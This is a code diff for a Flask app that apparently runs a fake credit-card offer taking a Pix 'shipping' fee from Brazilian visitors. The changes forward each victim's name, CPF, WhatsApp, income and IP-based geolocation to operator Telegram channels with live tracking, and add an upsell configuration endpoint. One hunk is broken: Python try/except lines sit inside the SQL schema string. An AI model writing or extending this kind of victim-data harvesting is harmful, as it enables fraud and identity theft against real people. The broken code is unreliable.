@@ -234,8 +234,15 @@ def init_db():
             created_at      REAL    NOT NULL DEFAULT (cast(strftime('%s','now') as real)),
             updated_at      REAL    NOT NULL DEFAULT (cast(strftime('%s','now') as real)),
             location        TEXT,
-            device_brand    TEXT
+            device_brand    TEXT,
+            tg_message_id   TEXT,
+            tg_chat_id      TEXT
         );
+        
+        try:
+            db.execute("ALTER TABLE leads ADD COLUMN tg_message_id TEXT;")
+            db.execute("ALTER TABLE leads ADD COLUMN tg_chat_id TEXT;")
+        except: pass
 
         CREATE TABLE IF NOT EXISTS telegram_admins (
             tg_id TEXT PRIMARY KEY,
@@ -371,9 +378,9 @@ def validate_cpf(cpf: str) -> bool:
 
 def send_telegram_notify(session_id, event_type="ENTRY"):
     try:
+        import requests
         db = get_db()
         row_token = db.execute("SELECT value FROM sys_config WHERE key='telegram_token'").fetchone()
-        
         cfg_rows = db.execute("SELECT key, value FROM sys_config").fetchall()
         cfg = {r["key"]: r["value"] for r in cfg_rows}
 
@@ -386,13 +393,13 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
         
         pay = db.execute("SELECT * FROM payments WHERE session_id=? ORDER BY created_at DESC LIMIT 1", (session_id,)).fetchone()
         
-        # Decide which channel to send
+        # Determine channel
         channel_id = None
         if event_type in ["PIX_PAID", "PIX_GENERATED"]:
             channel_id = cfg.get("tg_log_pagamentos") or cfg.get("tg_log_channel")
         elif event_type in ["ENTRY", "STEP_ACTION"]:
             channel_id = cfg.get("tg_log_acessos") or cfg.get("tg_log_channel")
-        else: # INFO_ADDED, CARD_CHOSEN
+        else:
             channel_id = cfg.get("tg_log_leads") or cfg.get("tg_log_channel")
             
         supreme_id = os.environ.get("ID_ADMIN_SUPREMO", os.environ.get("SUPREME_ADMIN_ID", os.environ.get("ADMIN_CHAT_ID")))
@@ -410,40 +417,81 @@ def send_telegram_notify(session_id, event_type="ENTRY"):
         }
         icon = icons.get(event_type, "ℹ️")
         
-        # Build the detailed Lead Card
-        texto = f"{icon} <b>ATUALIZAÇÃO DO LEAD ({event_type})</b> {icon}\n\n"
+        # Generate Geolocation link
+        geo_link = "N/A"
+        if lead['ip'] and lead['ip'] not in ['127.0.0.1', 'localhost']:
+            try:
+                ip_data = requests.get(f"http://ip-api.com/json/{lead['ip']}", timeout=2).json()
+                if ip_data.get('status') == 'success':
+                    lat, lon = ip_data.get('lat'), ip_data.get('lon')
+                    city, country = ip_data.get('city'), ip_data.get('country')
+                    geo_link = f"<a href='https://www.google.com/maps/search/?api=1&query={lat},{lon}'>{city}, {country} (Ver Satélite)</a>"
+            except: pass
+
+        texto = f"{icon} <b>RASTREAMENTO AVANÇADO DE LEAD</b> {icon}\n\n"
         texto += f"👤 <b>Nome:</b> {lead['nome'] or '...'}\n"
         texto += f"🪪 <b>CPF:</b> <code>{lead['cpf'] or '...'}</code>\n"
-        if lead.get('whatsapp'): texto += f"📱 <b>WhatsApp:</b> <code>{lead['whatsapp']}</code>\n"
-        texto += f"🌍 <b>IP:</b> <code>{lead['ip'] or '...'}</code>\n\n"
-        texto += f"📊 <b>ETAPAS DO FUNIL:</b>\n"
-        texto += f"📋 Motivo do Crédito: {lead['motivo_credito'] or '...'}\n"
-        texto += f"💼 Tipo de Renda: {lead['tipo_renda'] or '...'}\n"
-        texto += f"💰 Renda Informada: R$ {lead['renda'] or '...'}\n"
-        texto += f"📅 Dia Vencimento: {lead['dia_vencimento'] or '...'}\n"
-        texto += f"🎯 Limite Aprovado: R$ {lead['limite_aprovado'] or '...'}\n"
+        if lead.get('whatsapp'):
+            clean_wa = re.sub(r"\D", "", lead["whatsapp"])
+            texto += f"📱 <b>WhatsApp:</b> <a href='https://wa.me/55{clean_wa}'>{lead['whatsapp']}</a> ✅ (Validado)\n"
+        texto += f"🌍 <b>IP:</b> <code>{lead['ip'] or '...'}</code>\n"
+        if geo_link != "N/A":
+            texto += f"📍 <b>Localização:</b> {geo_link}\n"
+        texto += f"\n📊 <b>ETAPAS DO FUNIL (LIVE):</b>\n"
+        texto += f"✅ <b>Acesso Inicial:</b> Concluído\n"
+        if lead['cpf']: texto += f"✅ <b>Validação CPF:</b> {lead['cpf']}\n"
+        if lead['renda']: texto += f"✅ <b>Renda Informada:</b> R$ {lead['renda']}\n"
+        if lead['tipo_renda']: texto += f"✅ <b>Ocupação:</b> {lead['tipo_renda']}\n"
+        if lead['motivo_credito']: texto += f"✅ <b>Motivo:</b> {lead['motivo_credito']}\n"
+        if lead['dia_vencimento']: texto += f"✅ <b>Vencimento:</b> Dia {lead['dia_vencimento']}\n"
+        if lead['limite_aprovado']: texto += f"🎯 <b>Limite Aprovado:</b> R$ {lead['limite_aprovado']}\n"
 
         if lead['card_style']:
-            texto += f"💳 <b>Cartão Escolhido:</b> {lead['card_style']} ({lead['card_color']})\n"
+            texto += f"\n💳 <b>CARTÃO ESCOLHIDO:</b> {lead['card_style']} ({lead['card_color']})\n"
             
         if pay:
             texto += f"\n💸 <b>DADOS DO PAGAMENTO:</b>\n"
-            texto += f"Valor (Frete): R$ {pay['amount']}\n"
-            texto += f"Status Pix: <b>{lead['pix_status'] or 'PENDENTE'}</b>\n"
-            texto += f"ID: <code>{pay['payment_id']}</code>\n"
-
-        import requests
+            texto += f"💵 <b>Valor:</b> R$ {pay['amount']}\n"
+            
+            p_status = lead['pix_status']
+            if p_status in ['paid', 'completed']:
+                texto += f"🚦 <b>Status:</b> ✅ <b>PAGO E CONCLUÍDO!</b>\n"
+            else:
+                texto += f"🚦 <b>Status:</b> ⏳ <b>AGUARDANDO PAGAMENTO</b>\n"
+                
+            texto += f"🆔 <b>ID:</b> <code>{pay['payment_id']}</code>\n"
+            
         payload = {
             "chat_id": channel_id,
             "text": texto,
-            "parse_mode": "HTML"
+            "parse_mode": "HTML",
+            "disable_web_page_preview": True
         }
-        if channel_id:
-            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload, timeout=5)
+        
+        # Edit existing message or send new one
+        msg_id = lead.get('tg_message_id')
+        if msg_id:
+            payload["message_id"] = msg_id
+            resp = requests.post(f"https://api.telegram.org/bot{bot_token}/editMessageText", json=payload, timeout=5)
+            # If edit fails (e.g. message deleted), fallback to sendMessage
+            if not resp.json().get('ok'):
+                payload.pop("message_id", None)
+                resp = requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload, timeout=5)
+        else:
+            resp = requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload, timeout=5)
             
+        if resp.json().get('ok') and 'result' in resp.json():
+            new_msg_id = resp.json()['result']['message_id']
+            if new_msg_id != msg_id:
+                db.execute("UPDATE leads SET tg_message_id=?, tg_chat_id=? WHERE session_id=?", (new_msg_id, channel_id, session_id))
+                db.commit()
+
+        # Send to supreme admin too if different (just as a copy)
         if supreme_id and str(supreme_id) != str(channel_id):
             payload["chat_id"] = supreme_id
+            payload.pop("message_id", None)
             requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload, timeout=5)
+
     except Exception as e:
         log.error("Telegram Notify Error: %s", e)
 
@@ -1564,10 +1612,20 @@ def api_supreme_frete():
     db.commit()
     return jsonify({"ok": True})
 
+@app.route("/api/supreme/upsell", methods=["POST"])
+def api_supreme_upsell():
+    data = request.get_json() or {}
+    db = get_db()
+    for key in ['upsell_active', 'upsell_value', 'upsell_title', 'upsell_icon']:
+        if key in data:
+            db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES (?, ?)", (key, data[key]))
+    db.commit()
+    return jsonify({"ok": True})
+
 @app.route("/api/config", methods=["GET"])
 def api_get_config():
     db = get_db()
-    rows = db.execute("SELECT key, value FROM sys_config WHERE key IN ('frete_expresso', 'frete_padrao')").fetchall()
+    rows = db.execute("SELECT key, value FROM sys_config WHERE key IN ('frete_expresso', 'frete_padrao', 'upsell_active', 'upsell_value', 'upsell_title', 'upsell_icon')").fetchall()
     config = {r["key"]: r["value"] for r in rows}
     return jsonify(config)
 
